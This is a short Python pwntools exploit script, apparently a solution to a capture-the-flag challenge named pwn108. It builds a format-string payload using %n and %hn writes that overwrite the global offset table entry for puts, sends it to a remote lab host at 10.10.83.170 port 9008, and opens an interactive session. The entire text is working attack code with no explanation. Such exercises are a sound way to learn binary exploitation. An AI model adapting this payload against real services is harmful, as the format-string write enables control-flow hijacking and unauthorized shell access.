from pwn import *

context.binary = binary = ELF("./pwn108.pwn108", checksec=False)
#context.log_level = 'debug'

got_puts_address = binary.got.puts

junk_payload = b"A"*0x12

payload = b"%64X%13$n" + b"%4603X%14$hnAAA" + p64(got_puts_address+2) + p64(got_puts_address)
'''
with open("payload", "wb") as f:
	f.write(junk_payload)
	f.write(payload)
'''
#p = process()
p = remote("10.10.83.170", 9008)
p.send(junk_payload)
p.send(payload)
p.interactive()

